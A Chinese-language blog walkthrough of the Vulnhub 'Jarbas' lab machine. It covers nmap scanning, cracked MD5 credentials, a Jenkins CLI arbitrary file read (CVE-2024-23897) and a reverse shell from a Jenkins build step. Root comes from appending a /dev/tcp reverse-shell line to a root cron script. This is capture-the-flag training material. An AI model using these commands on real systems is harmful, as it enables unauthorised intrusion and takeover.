{"pageProps":{"postData":{"id":"VulnhubJarbas-Jenkins","contentHtml":"<h1>Jarbas-Jenkins</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/jarbas-1,232/\">https://www.vulnhub.com/entry/jarbas-1,232/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ul>\n<li>\n<p>扫描网段存活主机，因为主机是我最后添加的，所以靶机地址是<code>135</code>的</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>   \n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-21 14:03 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00036</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">91</span>:<span class=\"hljs-number\">76</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00021</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机开放端口，开放端口：<code>22,80,3306,8080</code></p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-21 14:05 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00074</span>s latency).\nNot shown: <span class=\"hljs-number\">65531</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n<span class=\"hljs-number\">3306</span>/tcp open  mysql\n<span class=\"hljs-number\">8080</span>/tcp open  http-proxy\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">91</span>:<span class=\"hljs-number\">76</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-21 14:07 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00076</span>s latency).\n\nPORT     STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp   open  ssh     OpenSSH <span class=\"hljs-number\">7.4</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp   open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">6</span> ((CentOS) PHP/<span class=\"hljs-number\">5.4</span>.<span class=\"hljs-number\">16</span>)\n<span class=\"hljs-number\">3306</span>/tcp open  mysql   <span class=\"hljs-title function_ invoke__\">MariaDB</span> (unauthorized)\n<span class=\"hljs-number\">8080</span>/tcp open  http    Jetty <span class=\"hljs-number\">9.4</span>.z-SNAPSHOT\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">08</span>:<span class=\"hljs-number\">91</span>:<span class=\"hljs-number\">76</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞，没什么值得注意的漏洞，不过发现了两个文件夹<code>/icons/</code> 和<code>/robots.txt</code></p>\n<pre><code class=\"hljs language-php\">map -script=vuln -p22,<span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">3306</span>,<span class=\"hljs-number\">8080</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-21 14:08 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00032</span>s latency).\n\nPORT     STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp   open  ssh\n<span class=\"hljs-number\">80</span>/tcp   open  http\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-csrf: Couldn'</span>t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-trace: TRACE is enabled\n| http-enum: \n|_  /icons/: Potentially interesting folder w/ directory listing\n3306/tcp open  mysql\n8080/tcp open  http-proxy\n| http-enum: \n|_  /robots.txt: Robots file\nMAC Address: 00:0C:29:08:91:76 (VMware)\n\n</span></code></pre>\n<p>渗透优先级 ：<code>80,8080</code>→<code>3306</code>→<code>22</code></p>\n</li>\n</ul>\n<h2>WEB渗透</h2>\n<h3>80端口</h3>\n<ul>\n<li>\n<p>扫描目录 <code>192.168.75.135:80</code></p>\n<pre><code class=\"hljs language-php\">python .\\dirsearch.py -u http:<span class=\"hljs-comment\">//192.168.75.135/</span>\n<span class=\"hljs-comment\">//</span>\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">200</span> -  <span class=\"hljs-number\">359</span>B  - /access.html\n[<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">58</span>] <span class=\"hljs-number\">403</span> -  <span class=\"hljs-number\">210</span>B  - /cgi-bin/\n</code></pre>\n</li>\n<li>\n<p>发现<code>/access.html</code> ，访问发现是有用的信息</p>\n<pre><code class=\"hljs language-php\">Creds encrypted in a safe way!\n&#x3C;image>\ntiago:<span class=\"hljs-number\">5978</span>a63b4654c73c60fa24f836386d87\ntrindade:f463f63616cb3f1e81ce46b39f882fd5\neder:<span class=\"hljs-number\">9</span>b38e2b1e8b12f426b0d208a7ab6cb98\n</code></pre>\n<p>乍一看很像MD5，破解后得到以下内容，大概是一些账号密码，在哪里使用暂时还不知道</p>\n<pre><code class=\"hljs language-php\">tiago:italia99\ntrindade:marianna\neder:vipsu\n</code></pre>\n</li>\n<li>\n<p>再查看前面nmap扫描出来的<code>icons</code> 目录，发现没什么有用的信息</p>\n</li>\n</ul>\n<h3>8080端口</h3>\n<ul>\n<li>\n<p>访问<code>8080</code>端口，发现是登陆页面，并且是<code>Jenkins CMS</code></p>\n<p><img src=\"/post-images/VulnhubJarbas-Jenkins/image8.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>先访问nmap扫描出来的<code>robots.txt</code> ,获得以下内容</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\"># we don't want robots to click \"build\" links</span>\nUser-agent: *\nDisallow: /\n</code></pre>\n<p>感觉也没啥利用的</p>\n</li>\n<li>\n<p>回到登陆页面，尝试使用之前获得的用户信息登录</p>\n<p>发现 <code>eder:vipsu</code> 可以登录进去</p>\n</li>\n<li>\n<p>进入后台，仔细挖掘一些有用的设置</p>\n<p><code>Jenkins CLI , 脚本命令行 , 系统信息</code> 等都是我们感兴趣的</p>\n<p><img src=\"/post-images/VulnhubJarbas-Jenkins/image9.png\" alt=\"image.png\"></p>\n<p>进入<code>关于jenkins</code> ，发现版本是 <code>2.113</code></p>\n</li>\n</ul>\n<h2>漏洞利用</h2>\n<ul>\n<li>\n<p>查阅信息，发现存在任意文件读取 **CVE-2024-23897，**我们尝试利用</p>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/qq_34594929/article/details/136446671\">https://blog.csdn.net/qq_34594929/article/details/136446671</a></p>\n</blockquote>\n</li>\n<li>\n<p>进入<code>Jenkins CLI</code> ，下载 <code>Jenkins-cli.jar</code></p>\n</li>\n<li>\n<p>然后到 <code>管理Jenkins</code> →<code>全局安全设置</code> →<code>勾选匿名用户具有可读权限</code></p>\n</li>\n<li>\n<p>打开kali命令行输入，获得<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-php\">java -jar jenkins-cli.jar -s http:<span class=\"hljs-comment\">//192.168.75.135:8080 connect-node '@/etc/passwd'</span>\n<span class=\"hljs-comment\">//</span>\nicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class=\"hljs-literal\">true</span>\nftp:x:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">50</span>:FTP User:/<span class=\"hljs-keyword\">var</span>/ftp:/sbin/nologin: No such agent <span class=\"hljs-string\">\"ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\"</span> exists.\nsystemd-network:x:<span class=\"hljs-number\">192</span>:<span class=\"hljs-number\">192</span>:systemd Network Management:/:/sbin/nologin: No such agent <span class=\"hljs-string\">\"systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin\"</span> exists.\ndaemon:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:daemon:/sbin:/sbin/nologin: No such agent <span class=\"hljs-string\">\"daemon:x:2:2:daemon:/sbin:/sbin/nologin\"</span> exists.\nlp:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">7</span>:lp:/<span class=\"hljs-keyword\">var</span>/spool/lpd:/sbin/nologin: No such agent <span class=\"hljs-string\">\"lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\"</span> exists.\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/bin/bash: No such agent <span class=\"hljs-string\">\"root:x:0:0:root:/root:/bin/bash\"</span> exists.\njenkins:x:<span class=\"hljs-number\">997</span>:<span class=\"hljs-number\">995</span>:Jenkins Automation Server:/<span class=\"hljs-keyword\">var</span>/lib/jenkins:/bin/<span class=\"hljs-literal\">false</span>: No such agent <span class=\"hljs-string\">\"jenkins:x:997:995:Jenkins Automation Server:/var/lib/jenkins:/bin/false\"</span> exists.\nadm:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">4</span>:adm:/<span class=\"hljs-keyword\">var</span>/adm:/sbin/nologin: No such agent <span class=\"hljs-string\">\"adm:x:3:4:adm:/var/adm:/sbin/nologin\"</span> exists.\nshutdown:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">0</span>:shutdown:/sbin:/sbin/shutdown: No such agent <span class=\"hljs-string\">\"shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\"</span> exists.\nsync:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">0</span>:sync:/sbin:/bin/sync: No such agent <span class=\"hljs-string\">\"sync:x:5:0:sync:/sbin:/bin/sync\"</span> exists.\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">12</span>:mail:/<span class=\"hljs-keyword\">var</span>/spool/mail:/sbin/nologin: No such agent <span class=\"hljs-string\">\"mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\"</span> exists.\ndbus:x:<span class=\"hljs-number\">81</span>:<span class=\"hljs-number\">81</span>:System message bus:/:/sbin/nologin: No such agent <span class=\"hljs-string\">\"dbus:x:81:81:System message bus:/:/sbin/nologin\"</span> exists.\npostfix:x:<span class=\"hljs-number\">89</span>:<span class=\"hljs-number\">89</span>::/<span class=\"hljs-keyword\">var</span>/spool/postfix:/sbin/nologin: No such agent <span class=\"hljs-string\">\"postfix:x:89:89::/var/spool/postfix:/sbin/nologin\"</span> exists.\noperator:x:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">0</span>:operator:/root:/sbin/nologin: No such agent <span class=\"hljs-string\">\"operator:x:11:0:operator:/root:/sbin/nologin\"</span> exists.\neder:x:<span class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:Eder Luiz:/home/eder:/bin/bash: No such agent <span class=\"hljs-string\">\"eder:x:1000:1000:Eder Luiz:/home/eder:/bin/bash\"</span> exists.\napache:x:<span class=\"hljs-number\">48</span>:<span class=\"hljs-number\">48</span>:Apache:/usr/share/httpd:/sbin/nologin: No such agent <span class=\"hljs-string\">\"apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin\"</span> exists.\nmysql:x:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">27</span>:MariaDB Server:/<span class=\"hljs-keyword\">var</span>/lib/mysql:/sbin/nologin: No such agent <span class=\"hljs-string\">\"mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin\"</span> exists.\npolkitd:x:<span class=\"hljs-number\">999</span>:<span class=\"hljs-number\">997</span>:User <span class=\"hljs-keyword\">for</span> polkitd:/:/sbin/nologin: No such agent <span class=\"hljs-string\">\"polkitd:x:999:997:User for polkitd:/:/sbin/nologin\"</span> exists.\nsshd:x:<span class=\"hljs-number\">74</span>:<span class=\"hljs-number\">74</span>:Privilege-separated SSH:/<span class=\"hljs-keyword\">var</span>/<span class=\"hljs-keyword\">empty</span>/sshd:/sbin/nologin: No such agent <span class=\"hljs-string\">\"sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\"</span> exists.\nhalt:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">0</span>:halt:/sbin:/sbin/halt: No such agent <span class=\"hljs-string\">\"halt:x:7:0:halt:/sbin:/sbin/halt\"</span> exists.\nnobody:x:<span class=\"hljs-number\">99</span>:<span class=\"hljs-number\">99</span>:Nobody:/:/sbin/nologin: No such agent <span class=\"hljs-string\">\"nobody:x:99:99:Nobody:/:/sbin/nologin\"</span> exists.\ngames:x:<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">100</span>:games:/usr/games:/sbin/nologin: No such agent <span class=\"hljs-string\">\"games:x:12:100:games:/usr/games:/sbin/nologin\"</span> exists.\nchrony:x:<span class=\"hljs-number\">998</span>:<span class=\"hljs-number\">996</span>::/<span class=\"hljs-keyword\">var</span>/lib/chrony:/sbin/nologin: No such agent <span class=\"hljs-string\">\"chrony:x:998:996::/var/lib/chrony:/sbin/nologin\"</span> exists.\nbin:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:bin:/bin:/sbin/nologin: No such agent <span class=\"hljs-string\">\"bin:x:1:1:bin:/bin:/sbin/nologin\"</span> exists.\n\nERROR: <span class=\"hljs-built_in\">Error</span> occurred <span class=\"hljs-keyword\">while</span> performing this command, see previous stderr output.\n</code></pre>\n<p>但是读取不了<code>/etc/shadow</code> ,不过我们发现<code>/etc/passwd</code>里面存在<code>eder</code> 用户，和我们进入后台的用户名一样，我们尝试一下使用<code>ssh</code>登录，登陆失败，换条路子走</p>\n</li>\n</ul>\n<h2>利用Jenkins后台反弹shell</h2>\n<ul>\n<li>\n<p>发现 新建任务里面的构建一个自由风格的软件项目里面可以执行<code>shell</code>代码</p>\n<p><img src=\"/post-images/VulnhubJarbas-Jenkins/image10.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>输入反弹shell代码保存</p>\n<p><img src=\"/post-images/VulnhubJarbas-Jenkins/image11.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>kali开启监听</p>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1234</span>\n<span class=\"hljs-comment\">//            </span>\nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n</code></pre>\n</li>\n<li>\n<p>在Jenkins里面点击构建，就会执行刚刚输入的代码</p>\n</li>\n<li>\n<p>成功获得shell</p>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1234</span>\nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>] <span class=\"hljs-number\">54884</span>\n\npython -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span> <span class=\"hljs-comment\">// 获得交互shell</span>\nbash-<span class=\"hljs-number\">4.2</span>$ ls\nls\nbash-<span class=\"hljs-number\">4.2</span>$ \n\n</code></pre>\n</li>\n</ul>\n<h2>提权</h2>\n<ul>\n<li>\n<p>查看通过Jenkins后台获得的shell权限</p>\n<pre><code class=\"hljs language-php\">bash-<span class=\"hljs-number\">4.2</span>$ whoami\njenkins\n<span class=\"hljs-comment\">//</span>\nbash-<span class=\"hljs-number\">4.2</span>$ sudo -l\nWe trust you have received the usual lecture <span class=\"hljs-keyword\">from</span> the local System\nAdministrator. It usually boils down to these three things:\n\n    <span class=\"hljs-comment\">#1) Respect the privacy of others.</span>\n    <span class=\"hljs-comment\">#2) Think before you type.</span>\n    <span class=\"hljs-comment\">#3) With great power comes great responsibility.</span>\n\n[sudo] password <span class=\"hljs-keyword\">for</span> jenkins: ^C <span class=\"hljs-comment\">//要密码</span>\n<span class=\"hljs-comment\">//                                                                                           </span>\nbash-<span class=\"hljs-number\">4.2</span>$ uname -a\nLinux jarbas <span class=\"hljs-number\">3.10</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">693.21</span>.<span class=\"hljs-number\">1</span>.el7.x86_64 <span class=\"hljs-comment\">#1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>\n<span class=\"hljs-comment\">//</span>\nbash-<span class=\"hljs-number\">4.2</span>$ ls -l\ntotal <span class=\"hljs-number\">0</span>\n<span class=\"hljs-comment\">//</span>\nbash-<span class=\"hljs-number\">4.2</span>$ dpkg -l\nbash: dpkg: command not found\n</code></pre>\n<p>权限不高不低</p>\n</li>\n<li>\n<p>尝试查看<code>crontab</code>是否有<code>root</code>运行的自动化任务</p>\n<pre><code class=\"hljs language-php\">bash-<span class=\"hljs-number\">4.2</span>$ cat /etc/crontab\ncat /etc/crontab\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\n<span class=\"hljs-comment\"># For details see man 4 crontabs</span>\n\n<span class=\"hljs-comment\"># Example of job definition:</span>\n<span class=\"hljs-comment\"># .---------------- minute (0 - 59)</span>\n<span class=\"hljs-comment\"># |  .------------- hour (0 - 23)</span>\n<span class=\"hljs-comment\"># |  |  .---------- day of month (1 - 31)</span>\n<span class=\"hljs-comment\"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>\n<span class=\"hljs-comment\"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>\n<span class=\"hljs-comment\"># |  |  |  |  |</span>\n<span class=\"hljs-comment\"># *  *  *  *  * user-name  command to be executed</span>\n*/<span class=\"hljs-number\">5</span> * * * * root /etc/script/CleaningScript.sh >/dev/<span class=\"hljs-literal\">null</span> <span class=\"hljs-number\">2</span>>&#x26;<span class=\"hljs-number\">1</span>\n</code></pre>\n<p>文件内容是：</p>\n<pre><code class=\"hljs language-php\">bash-<span class=\"hljs-number\">4.2</span>$ cat /etc/script/CleaningScript.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n\nrm -rf /<span class=\"hljs-keyword\">var</span>/log/httpd/access_log.txt\n</code></pre>\n<p>存在一条每隔五分钟 使用root权限清理某些东西的自动化任务</p>\n</li>\n<li>\n<p>我们可以尝试追加反弹shell在该脚本尾部，让它使用root权限来执行反弹shell代码</p>\n<p>提权成功，获得root权限，并且读取flag内容</p>\n<pre><code class=\"hljs language-php\">bash-<span class=\"hljs-number\">4.2</span>$ <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"/bin/bash >&#x26; /dev/tcp/192.168.75.131/1235 0>&#x26;1\"</span> >> /etc/script/CleaningScript.sh\n<span class=\"hljs-comment\">//</span>\n&#x3C;&#x26; /dev/tcp/<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>/<span class=\"hljs-number\">1235</span> <span class=\"hljs-number\">0</span>>&#x26;<span class=\"hljs-number\">1</span><span class=\"hljs-string\">\" >> /etc/script/CleaningScript.sh       \n</span></code></pre>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1235</span>                                                        \nlistening on [any] <span class=\"hljs-number\">1235</span> ...\n<span class=\"hljs-comment\">//</span>\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.135</span>] <span class=\"hljs-number\">58338</span>\npython -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>\n[root@jarbas ~]<span class=\"hljs-comment\"># whoami</span>\nwhoami\nroot\n[root@jarbas ~]<span class=\"hljs-comment\"># uname -a</span>\nuname -a\nLinux jarbas <span class=\"hljs-number\">3.10</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">693.21</span>.<span class=\"hljs-number\">1</span>.el7.x86_64 <span class=\"hljs-comment\">#1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>\n[root@jarbas ~]<span class=\"hljs-comment\"># dpkg -l</span>\ndpkg -l\nbash: dpkg: command not found\n[root@jarbas ~]<span class=\"hljs-comment\"># cat flag.txt //读取flag</span>\ncat flag.txt\nHey!\n\nCongratulations! You got it! I always knew you could <span class=\"hljs-keyword\">do</span> it!\nThis challenge was very easy, huh? =)\n\nThanks <span class=\"hljs-keyword\">for</span> appreciating this machine.\n\n@tiagotvrs \n[root@jarbas ~]<span class=\"hljs-comment\"># </span>\n\n</code></pre>\n</li>\n</ul>","title":"Vulnhub - Jarbas-Jenkins","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"},"recentPosts":[{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"}]},"__N_SSG":true}